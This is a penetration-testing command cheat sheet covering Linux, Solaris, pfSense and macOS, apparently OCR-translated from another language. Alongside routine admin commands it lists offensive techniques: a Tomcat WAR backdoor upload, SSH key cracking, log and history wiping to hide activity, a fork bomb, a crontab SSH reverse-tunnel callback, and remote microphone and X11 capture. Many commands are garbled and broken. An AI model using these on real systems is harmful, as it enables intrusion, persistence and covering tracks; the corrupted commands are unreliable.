---
title: Nix
sidebar: mydoc_sidebar
permalink: nix.html
folder: mydoc
---



# Linux

## Network commands

| **Command** | **Explanation** |
| :--- | :--- |
| watch ss -tp | Network communication
| netstat -ant | tcp or udp communication -anu=udp |
| netstat -tulpn | Communication with PIDs
| lsof -i | Established communication
| smb:// ip /share | smb shared environment access
| share user x.x.x.x c$ | Mount the shared Windows environment
| smbclient -0 user\\ ip \ share | Connect to SMB
| ifconfig eth\# ip I cidr | Set IP and netmask
| ifconfig eth0:1 ip I cidr | Virtual interface setting
| route add default gw gw lp | Set GW |
| ifconfig eth\# mtu \[size\] | Change the MTU size
| export MAC=xx: XX: XX: XX: XX: XX | Change the MAC
| ifconfig int hw ether MAC | Change the MAC
| macchanger -m MAC int | Change Mac in Backtrack |
| iwlist int scan | Wi-Fi scanner
| nc -lvvp port | Listening to a specific port
| python3 -m http.server port | Create a web server
| dig -x ip | Identifying the domains of an ip
| host ip | Identifying the domains of an ip
| host -t SRV \_ service tcp.url.com | Identification of domain SRV |
| dig @ ip domain -t AXrR | Identify DNS Zone Xfer |
| host -1 domain namesvr | Identify DNS Zone Xfer |
| ip xfrm state list | Show available VPN |
| ip addr add ip I cidr aev ethO | Add 'hidden' interface
| /var/log/messages I grep DHCP | DHCP list
| tcpkill host ip and port port | Blocking ip:port |
| echo "1" /proc/sys/net/ipv4/ip forward | Enable IP Forwarding
| echo ''nameserver x.x.x.x'' /etc7resolv.conf | Add DNS server
| showmount -e ip | Show mounted points
| mkdir /site_backups; mount -t nfs ip:/ /site_backup | mount route shared by ip |


## system information

| **Command** | **Explanation** |
| :--- | :--- |
| nbstate -A -ip | Get hostname for ip
| id | Current username
| w| Logged in user
| who -a | User information
| last -a | The last logged in user
| ps -ef | Available system processes \(or use top\) |
| df -h | The amount of disk usage \(or using free\) |
| uname -a | Show the kernel version along with the processor structure
| mount | Mount the file system
| getent passwd | Display the list of users
| PATH~$PATH:/home/mypath | Add variable to PATH
| kill pid | Kill process with pid |
| cat /etc/issue | Display operating system information
| cat /etc/'release' | Display operating system version information
| cat /proc/version | Display kernel version information
| rpm --query -all | Installed packages \(in Redhat\) |
| rpm -ivh ' .rpm | Installing rpm packages \(to remove -e=remove\) |
| dpkg -get-selections | Installed packages \(in Ubuntu\) |
| dpkg -I '.deb | Install DEB packages \(to remove -r=remove\) |
| pkginfo | Installed packages \(on Solaris\) |
| which tscsh/csh/ksh/bash | Display the paths of executable files
| chmod -so tcsh/csh/ksh | Disabling shell and also forcing to use bash |
| find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \; | Finding files with suid |
| find / -uid 0 -perm -4000 -type f 2>/dev/null | Finding files with suid |
| find / -writable ! -user `whoami` -type f ! -path "/proc/*" ! -path "/sys/*" -exec ls -al {} \; 2>/dev/null | Show writable files


## Functional commands

| **Command** | **Explanation** |
| :--- | :--- |
| python -c "import pty;pty.spawn('/bin/bash')" | Shell interactive
| wget http:// url -0 url.txt -o /dev/null | Get the address
| rdesktop ip | Access to desktop ip |
| scp /tmp/file user@x.x.x.x:/tmp/file | Send file
| scp user@ remoteip :/tmp/file /tmp/file | Get the file
| useradd -m user | added by the user
| passwd user | Change user password
| rmuser unarne | Delete user
| script -a outfile | Loose recording: Ctrl-D to stop |
| apropos subject | Related commands
| History | History of user commands
| ! num | Executive lines in history
| ssh2john.py id_rsa > ssh-key | Find the passphrase
| john ssh-key | Find the passphrase
| ssh -i id_rsa user@ip | Connect with key and passphrase
| id -u <username> | Get user id
| cut -d: -f3 < <(getent group GROUPNAME) | Get group id
| curl -G 'http://example.com/file.php' --data-urlencode 'cmd=echo ssh-rsa AA...........' | Sending information with the get method in curl
| curl --user 'tomcat:$3cureP4s5w0rd123!' --upload-file exploit.war "http://megahosting.com:8080/ma
nager/text/deploy?path=/exploit.war" | Create backdoor with lfi vulnerability in java |

## File commands

<table>
   <thead>
     <tr>
       <th style="text-align:left"><b>Command</b>
       </th>
       <th style="text-align:left"><b>Description</b>
       </th>
     </tr>
   </thead>
   <tbody>
     <tr>
       <td style="text-align:left">diff file file2</td>
       <td style="text-align:left">Compare two files</td>
     </tr>
     <tr>
       <td style="text-align:left">rm -rf dir</td>
       <td style="text-align:left">Forced deletion of folders nested</td>
     </tr>
     <tr>
       <td style="text-align:left">shred -f -u file</td>
       <td style="text-align:left">Rewrite or delete the file</td>
     </tr>
     <tr>
       <td style="text-align:left">touch -r ref file</td>
       <td style="text-align:left">Adapting timestamp related to ref_file</td>
     </tr>
     <tr>
       <td style="text-align:left">touch -t YYYYMMDDHHSS file</td>
       <td style="text-align:left">set file timestamp</td>
     </tr>
     <tr>
       <td style="text-align:left">sudo fdisk -1</td>
       <td style="text-align:left">List of connected drivers</td>
     </tr>
    <tr>
      <td style="text-align:left">mount /dev/sda# /mnt/usbkey</td>
	  <td style="text-align:left">Mounting usb devices</td>
    </tr>
    <tr>
      <td style="text-align:left">md5sum -t file</td>
<td style="text-align:left">md5 crisp accounting</td>
    </tr>
    <tr>
      <td style="text-align:left">echo -n &quot;str&quot; | md5sum</td>
<td style="text-align:left">Generate md5 hash</td>
    </tr>
    <tr>
      <td style="text-align:left">shalsum file</td>
<td style="text-align:left">The SHAl hash of the file</td>
    </tr>
    <tr>
      <td style="text-align:left">sort -u</td>
<td style="text-align:left">Relating and displaying unique lines</td>
    </tr>
    <tr>
      <td style="text-align:left">grep -c &apos;&apos;str&apos;&apos; file</td>
collection of lines
    </tr>
    <tr>
      <td style="text-align:left">grep -Hnri word * | vim -</td>
<td style="text-align:left">Search for the desired word in files along with the file name</td>
    </tr>
    <tr>
      <td style="text-align:left">grep -rial word</td>
<td style="text-align:left">Files containing the desired word</td>
    </tr> 
    <tr>
      <td style="text-align:left">tar cf file.tar files</td>
<td style="text-align:left">Create .tar from files</td>
    </tr>
    <tr>
      <td style="text-align:left">tar xf file.tar</td>
<td style="text-align:left">Extract .tar</td>
    </tr>
    <tr>
      <td style="text-align:left">tar czf file.tar.gz files</td>
<td style="text-align:left">Create .tar.gz</td>
    </tr>
   <tr>
       <td style="text-align:left">tar xzf file.tar.gz</td>
       <td style="text-align:left">Extract .tar.gz</td>
     </tr>
     <tr>
       <td style="text-align:left">tar cjf file.tar.bz2 files</td>
       <td style="text-align:left">Create .tar.bz2</td>
     </tr>
     <tr>
       <td style="text-align:left">tar xjf file.tar.bz2</td>
       <td style="text-align:left">Extract .tar.bz2</td>
     </tr>
     <tr>
       <td style="text-align:left">gzip file</td>
       <td style="text-align:left">Compress and rename the file</td>
     </tr>
     <tr>
       <td style="text-align:left">gzip -d file. gz</td>
       <td style="text-align:left">Not compressing file.gz</td>
     </tr>
     <tr>
       <td style="text-align:left">upx -9 -o out.exe orig.exe</td>
       <td style="text-align:left">Get UPX packs related to orig.exe</td>
     </tr>
     <tr>
       <td style="text-align:left">zip -r zipname.zip \Directory\&apos;</td>
       <td style="text-align:left">Create zip</td>
     </tr>
     <tr>
       <td style="text-align:left">dd skip=lOOO count=2000 bs=S if=file of=file</td>
       <td style="text-align:left">Separate 1 to 3 KB from the file</td>
     </tr>
     <tr>
       <td style="text-align:left">split -b 9K file prefix</td>
       <td style="text-align:left">Separation of 9 KB sections from the file</td>
     </tr>
     <tr>
       <td style="text-align:left">awk &apos;sub(&quot;$&quot;.&quot;\r&quot;)&apos; unix.txt win.txt</td>
       <td
       style="text-align:left">Windows compatible txt file</td>
     </tr>
     <tr>
       <td style="text-align:left">find -i -name file -type &apos;.pdf</td>
       <td style="text-align:left">Search for PDF files</td>
     </tr>
     <tr>
       <td style="text-align:left">
         <p>find I -perm -4000 -o -perm -2000 -exec ls -</p>
         <p>ldb {} \;</p>
       </td>
       <td style="text-align:left">Search setuid files</td>
     </tr>
     <tr>
       <td style="text-align:left">dos2unix file</td>
       <td style="text-align:left">Switch to *nix format</td>
     </tr>
     <tr>
       <td style="text-align:left">file file</td>
       <td style="text-align:left">Determine the file type and format</td>
     </tr>
     <tr>
       <td style="text-align:left">chattr (+/-)i file</td>
       <td style="text-align:left">setting or not setting the immutable bit</td>
     </tr>
     <tr>
       <td style="text-align:left">while [ $? -eq 0 ]; do cd flag/; done</td>
       <td style="text-align:left">Enter infinite nested folder</td>
     </tr>
   </tbody>
</table>

## Miscellaneous commands

| **Command** | **Explanation** |
| :--- | :--- |
| unset HISTFILE | Disable reports in history
| ssh user@ ip arecord - I aplay - | Remote microphone recording
| gcc -o outfile myfile.c | Compile C, C++
| init 6 | Restart \(0 = shutdown\) |
| cat /etc/ 1 syslog 1 .conf 1 grep -v ''"\#'' | list of report files |
| grep 'href=' file 1 cut -d"/" -f3 I grep url \| sort -u | Separation of links url.com |
| dd if=/dev/urandom of= file bs=3145728 count=100 | Create a 3 MB file

## Controller commands



| **Command** | **Explanation** |
| :--- | :--- |
| echo "" /var/log/auth.log | Delete the auth.log file
| echo '''' -/.bash history | Delete the session history of the current user
| rm -/.bash history/ -rf | Delete the file .bash\_history |
| history -c | Delete the session history of the current user
| export HISTFILESIZE=0 | Setting the maximum lines of the history file to zero
| export HISTSIZE=0 | Setting the maximum number of commands in the history file to zero
| unset HISTFILE | delete history \(need to log in again to apply\) |
| kill -9 $$ | Delete the current meeting
| ln /dev/null -/.bash\_historj -sf | Permanently send all history commands to /dev/null

## File system structure

| **Position** | **Explanation** |
| :--- | :--- |
| /bin | System binary files
| /boot | Files related to the boot process
| /dev | Interfaces related to system devices
| /etc | System configuration files
| /home | A basic place for users and libraries
| /opt | Essential software libraries
| /proc | Executive and systemic processes
| /root | The base path for the root user
| /sbin | executable files of the root user
| /tmp | Temporary files
| /usr | Not very necessary files
| /var | System variables file

## Files

| **File** | **Explanation** |
| :--- | :--- |
| /etc/shadow | Hash of local users |
| /etc/passwd | Local users
| /etc/group | Local groups
| /etc/rc.d | Startup services
| /etc/init.d | Services
| /etc/hosts | List of hostnames and IPs
| /etc/HOSTNAME | Show hostname along with domain
| /etc/network/interfaces | Network communication
| /etc/profile | System environment variables
| /etc/apt/sources.list | list of ubuntu distribution sources
| /etc/resolv.conf | namserver settings
| /horne/ user /.bash history | bash history \(also in /root/\) |
| /usr/share/wireshark/manuf | MAC Manufacturer |
| -/.ssh/ | Location of ssh keystores
| /var/log | System reports file \(for Linux\) |
| /var/adrn | System reports file \(for Unix\) |
| /var/spool/cron | List of files in cron
| /var/log/apache/access.log | Apache communication reports
| /etc/fstab | Fixed system information file

## Using powershell

### Installation

```text
sudo apt install gss-ntlmssp
sudo apt-get install powershell
```

### Login using username and password

```text
pwsh
$offsec_session = New-PSSession -ComputerName 10.10.10.210 -Authentication Negotiate -Credential k.svensson
Enter-PSSession $offsec_session
```

### Create symlink

```text
New-Item -ItemType Junction -Path 'C:\ProgramData' -Target 'C:\Users\Administrator'
```

## Script writing

### Create Ping sweep

```text
for x in {1 .. 254 .. l};do ping -c 1 1.1.1.$x lgrep "64 b" lcut -d" "-f4 ips.txt; done
```

### Automating the domain name resolve process in the bash script

```text
#!/bin/bash
echo "Enter Class C Range: i.e. 192.168.3"
read range
for ip in {1 .. 254 .. l}; do
host $range.$ip lgrep " name pointer " lcut -d"
done
```

### Creating a Fork bomb \(Creating a process to crash the system\)

```text
: (){:|: & };:
```

### dns reverse lookup process

```text
for ip in {1 .. 254 .. 1}; do dig -x 1.1.1.$ip | grep $ip
dns.txt; done
```

### Do not block Ip script

```text
#!/bin/sh
# This script bans any IP in the /24 subnet for 192.168.1.0 starting at 2
# It assumes 1 is the router and does not ban IPs .20, .21, .22
i=2
while
$i -le 253 l
do
if [ $i -ne 20 -a $i -ne 21 -a $i -ne 22 ]; then
echo "BANNED: arp -s 192.168.1.$i"
arp -s 192.168.1.$i OO:OO:OO:OO:OO:Oa
else
echo "IP NOT BANNED: 192.168.1.$i"
fi
i='expr $i +1`
done
```

### Create SSH Callback

```text
Set up script in crontab to callback every X minutes.
Highly recommend YOU
set up a generic user on red team computer (with no shell privs).
Script
will use the private key (located on callback source computer) to connect
to a public key (on red team computer). Red teamer connects to target via a
local SSH session (in the example below, use #ssh -p4040 localhost)
#!/bin/sh
# Callback: script located on callback source computer (target)
killall ssh /dev/null 2 &1
sleep 5
REMLIS-4040
REMUSR-user
HOSTS=''domainl.com domain2.com domain3.com''
for LIVEHOST in SHOSTS;
do
    COUNT=S(ping -c2 $LIVEHOST | grep 'received' | awk -F','{ print $2 } '
    | awk ' ( print $1 | ')
    if [ [ $COUNT -gt 0 ] ] ; then
    ssh -R $(REMLIS}:localhost:22 -i
    "/home/$(REMUSR}/.ssh/id rsa" -N $(LIVEHOST} -1 $(REMUSR}
fi
```

## Iptables command

Use iptable for ipv6

<table>
   <thead>
     <tr>
       <th style="text-align:left"><b>Command</b>
       </th>
       <th style="text-align:left"><b>Description</b>
       </th>
     </tr>
   </thead>
   <tbody>
     <tr>
       <td style="text-align:left">iptables-save -c file</td>
       <td style="text-align:left">Extract iptable rules and save to file</td>
     </tr>
     <tr>
       <td style="text-align:left">iptables-restore file</td>
       <td style="text-align:left">retrieving iptables rules</td>
     </tr>
     <tr>
       <td style="text-align:left">iptables -L -v --line-numbers</td>
       <td style="text-align:left">List of all rules with their line number</td>
     </tr>
     <tr>
       <td style="text-align:left">iptables -F</td>
       <td style="text-align:left">Restart all rules</td>
     </tr>
     <tr>
      <td style="text-align:left">
         <p>iptables -P INPUT/FORWARD/OUTPUT</p>
         <p>ACCEPT/REJECT/DROP</p>
       </td>
       <td style="text-align:left">Policy change if rules are not met</td>
     </tr>
     <tr>
       <td style="text-align:left">iptables -A INPUT -i interface -m state --state RELATED,ESTABLcSHED -j
         ACCEPT</td>
       <td style="text-align:left">Allow connections made on INPUT</td>
     </tr>
     <tr>
       <td style="text-align:left">iptables -D INPUT 7</td>
       <td style="text-align:left">Remove 7 layers of inbound rules</td>
     </tr>
     <tr>
       <td style="text-align:left">iptables -t raw -L -n</td>
       <td style="text-align:left">Increase productivity by disabling statefulness</td>
     </tr>
     <tr>
       <td style="text-align:left">iptables -P INPUT DROP</td>
       <td style="text-align:left">Delete all packets</td>
     </tr>
   </tbody>
</table>

## Allow ssh and port 22 in outbound

```text
iptables -A OUTPUT -o iface -p tcp --dport 22 -m state --state
NEW,ESTABLISHED -j ACCEPT
iptables -A INPUT -i
iface -p tcp --sport 22 -m state --state
ESTABLISHED -j ACCEPT
```

## Allow ICMP in outband

```text
iptacles -A OUTPUT -i iface -p icmp --icmp-type echo-request -j ACCEPT
iptables -A INPUT -o iface -p icmp --icmp-type echo-reply -j ACCEPT
```

## Create port forward

```text
echo "1" /proc/sys/net/ipv4/lp forward
# OR- sysctl net.ipv4.ip forward=1
iptables -t nat -A PREROUTING -p tcp -i ethO -j DNAT -d pivotip --dport
443 -to-destination attk ip :443
iptables -t nat -A POSTROUTING -p tcp -i eth0 -j SNAT -s target subnet
cidr -d attackip --dport 443 -to-source pivotip
iptables -t filter -I FORWARD 1 -j ACCEPT
```

## Allow 1.1.1.0/24 and port 80,443 and create log in /var/log/messages

```text
iptables -A INPU~ -s 1.1.1.0/24 -m state --state RELATED,ESTABLISHED,NEW
-p tcp -m multipart --dports 80,443 -j ACCEPT
iptables -A INPUT -i ethO -m state --state RELATED,ESTABLISHED -j ACCEPT
iptables -P INPUT DROP
iptables -A OUTPUT -o ethO -j ACCEPT
iptables -A INPUT -i lo -j ACCEPT
iptables -A OUTPUT -o lo -j ACCEPT
iptables -N LOGGING
iptables -A INPUT -j LOGGING
iptables -A LOGGING -m limit --limit 4/min -j LOG --log-prefix "DROPPED "
iptables -A LOGGING -j DROP
```

## Update-rc.d file


Check and create launcher

<table>
  <thead>
    <tr>
      <th style="text-align:left"><b>دستور</b>
      </th>
      <th style="text-align:left"><b>توضیح</b>
      </th>
    </tr>
  </thead>
  <tbody>
     <tr>
       <td style="text-align:left">service --status-all</td>
       <td style="text-align:left">
         <p>[+] Service starts at boot</p>
         <p>[-] Service does not start</p>
       </td>
     </tr>
     <tr>
       <td style="text-align:left">service service start</td>
       <td style="text-align:left">start service</td>
     </tr>
     <tr>
       <td style="text-align:left">service service stop</td>
       <td style="text-align:left">stop service</td>
     </tr>
     <tr>
       <td style="text-align:left">service service status</td>
       <td style="text-align:left">Check service status</td>
     </tr>
     <tr>
       <td style="text-align:left">update-rc.d -f service remove</td>
       <td style="text-align:left">Remove the existing system startup service (-f for the /etc/init.d file if it already exists)</td>
     </tr>
     <tr>
       <td style="text-align:left">update-rc.d service defaults</td>
       <td style="text-align:left">Added service in system startup</td>
     </tr>
  </tbody>
</table>

## Chkconfig

Available in red hat distributions such as centos and oracle



| **Command** | **Explanation** |
| :--- | :--- |
| chkconfig --list | List of available services and implementation status
| chkconfig service -list | The status of a service
| chkconfig service on \[--level 3\] | Adding the service \[Its layer can also be specified\] |
| chkconfig service off \[--level 3\] e.g. chkconfig iptables off | Remove the service

## Screen command

| **Command** | **Explanation** |
| :--- | :--- |
| screen -S name | Create a new screen with the name |
| screen -ls | List of running screens
| screen -r name | Addition to screen with the name |
| screen -S name -X cmd | Send command to screen with the name |
| C-a? | List of key combinations \(help\) |
| C-a d | Addition removal
| C-a D D | Removal of joining and leaving
| C-a c | Create a new window
| C-a C-a | Switch to the last window
| C-a 'num\|name | Switch to the window named |
| C-a " | Show window list and changes |
| C-a k | Delete the current window
| C-a S | Horizontal separation of the display
| C-a V | Vertical separation of the display
| C-a tab | Jump to the last screen
| C-a X | Delete the current section
| C-a Q | Delete all sections except the current section

## X11

### Remote recording of X11 window and changing its format to JPG

```text
xwd -display ip :0 -root -out /tmp/test.xpm
xwud -in /tmp/test1.xpm
convert /tmp/test.xpm -resize 1280x1024 /tmp/test.jpg
```

### Open X11 in stream mode

```text
xwd -display 1.1.1.1:0 -root -silent -out x11dump
Read dumped file with xwudtopnm or GIMP
```

## TCPDump command

### Record packets in eth0 and change it from ASCII and hex and save it in the file

```text
tcpdump -i ethO -XX -w out.pcap
```

### Recording of all traffic 2.2.2.2

```text
tcpdump -i ethO port 80 dst 2.2.2.2
```

### Show all ip connections

```text
tcpdump -i ethO -tttt dst 192.168.1.22 and not net 192.168.1.0/24
```

## Show all ping outputs

```text
tcpdump -i ethO 'icmp[icmptype] == icmp-echoreply'
```

### Record 50 dns packets and display timestamp

```text
tcpdump -i ethO -c 50 -tttt 'udp and port 53'
```

## Kali default commands

### Equivalent to WMIC

```text
wmis -U DOMAIN\ user % password //DC cmd.exe /c command
```

### Mount SMB shared space

```text
# Mounts to /mnt/share. For other options besides ntlmssp, man mount.cifs
mount.cifs // ip /share /mnt/share -o
user=user,pass=pass,sec=ntlmssp,domain=domain,rw
```

### KALI UPDATE

```text
apt-get update
apt-get upgrade
```

### Checking the operating system for the possibility of upgrading access

```text
https://github.com/rebootuser/LinEnum
Example: ./LinEnum.sh -s -k keyword -r report -e /tmp/ -t
```

### List of all processes with root access

```text
https://github.com/DominicBreuker/pspy
For example: ./pspy64 -pf -i 1000
```

## The PFSENSE command


| **Command** | **Explanation** |
| :--- | :--- |
| pfSsh.php | Shell pfSense |
| pfSsh.php playback enableallowallwan | Allowing connections to inbound connections on the WAN \(Adding hidden rules to WAN rules \) |
| pfSsh.php playback enablesshd | Enable inbound/outbound ssh
| pfctl -sn | Show NAT rules
| pfctl -sr | Show filter rules
| pfctl -sa | Show all rules
| viconfig | Edit settings
| rm /tmp/config.cache | Target cache \(or backup\) settings after its execution
| /etc/rc.reload\_all | Reload the entire configuration |

## SOLARIS operating system

| **Command** | **Explanation** |
| :--- | :--- |
| ifconfig -a | List of all interfaces
| netstat -in | List of all interfaces
| ifconfig -r | List of routes
| ifconfig eth0 dhcp | Start DHCP in user |
| ifconfig eth0 plumb up ip netmask nmask | IP setting
| route add default ip | Gateway setting
| logins -p | List of users and passwords
| svcs -a | List of all services along with status
| prstat -a | Status of processes \(also command top\) |
| svcadm start ssh | Start the SSH service
| inetadm -e telnet \(-d for disable\) | telnet activation
| prtconf I grep Memorj | Total physical memory
| iostat -En | Hard disk size
| showrev -c /usr/bin/bash | Binary information
| shutdown -i6 -g0 -y | Restart the system
| dfmounts | List of users connected to NFS
| smc | GUI management
| snoop -d int -c pkt \# -o results.pcap | Packet recording
| /etc/vfstab | Mounted system file table
| /var/adm/logging | Reports list of login attempts
| /etc/default/' | Default settings
| /etc/system | Kernel modules and settings
| /var/adm/messages | syslog path |
| /etc/auto ' | Automounter settings file
| /etc/inet/ipnodes | IPv4 and IPv6 hosts files

## Important cache files

| **File** | **Description** |
| :--- | :--- |
| ~/.viminfo | vim editor file |


# Mac

## Situational Awareness

| **Command** | **Explanation** |
| :--- | :--- |
| top | shows real-time system statistics including CPU usage, memory usage, and running processes. |
| ps aux | displays a list of running processes with their associated details. |
| netstat | displays active network connections, routing tables, and a number of network interface and protocol statistics. |shows all active network connections and which processes are using them.displays a list of running processes with their associated details. |
| tcpdump | allows the capture and analysis of network traffic. |
| tail -f /var/log/system.log | displays real-time updates to the macOS system log. |
| log show --predicate 'process == "PROCESS_NAME"' --info | displays system log entries for a specific process. |
| fs_usage | shows real-time file system activity, including which files are being accessed and by which processes. |
| fseventer | displays a graphical representation of file system activity. |
| dtrace | allows the tracing and analysis of system events. |
| launchctl list | displays a list of all currently loaded launch daemons and agents. |

  


## User Plist File Enumeration

| **Command** | **Explanation** |
| :--- | :--- |
| `/Users/<username>/Library/Preferences/.GlobalPreferences.plist` | The user plist file for the currently logged-in user can be found in here |
| `/Users/<username>/Library/Preferences/` | Other user plist files can be found in here |
| `defaults read <path_to_plist_file>` | Read a plist file |
| `defaults write <path_to_plist_file> <key> <value>` | Write a plist file |
| `defaults delete <path_to_plist_file> <key>` | Delete a key from a plist file |
| `PlistBuddy -c "Open <path_to_plist_file>"` | Open a plist file |
| `PlistBuddy -c "Print <key>" <path_to_plist_file>` | Print a value from a plist file |
| `PlistBuddy -c "Add <key> <type> <value>" <path_to_plist_file>` | Add a new key-value pair to a plist file |
| `PlistBuddy -c "Delete <key>" <path_to_plist_file>` | Delete a key from a plist file |
| `PlistBuddy -c "Set <key> <value>" <path_to_plist_file>` | Set the value of a key in a plist file |
| `plutil -lint <path_to_plist_file>` | Validate a plist file |
| `plutil -convert xml1 <path_to_plist_file>` | Convert a plist file to XML format |



## User & Group


| **Command** | **Explanation** |
| :--- | :--- |
| `sudo dscl . -create /Users/newusername` | create a new user |
| `sudo dscl . -passwd /Users/newusername password` | set the user's password |
| `sudo dscl . -append /Groups/admin GroupMembership newusername` | make the user an administrator |
| `sudo dseditgroup -o create -r "Group Name" groupname` | create a new group |
| `sudo dseditgroup -o edit -a username -t user groupname` | add users to the group |
| `dscl . -read /Groups/groupname GroupMembership` | list the members of a group |
| `sudo dseditgroup -o delete groupname` | delete a group |
| `sudo dseditgroup -o edit -d username -t user groupname` | remove a user from a group |
| `sudo dseditgroup -o edit -n newgroupname -r oldgroupname` | rename a group |



{% include links.html %}
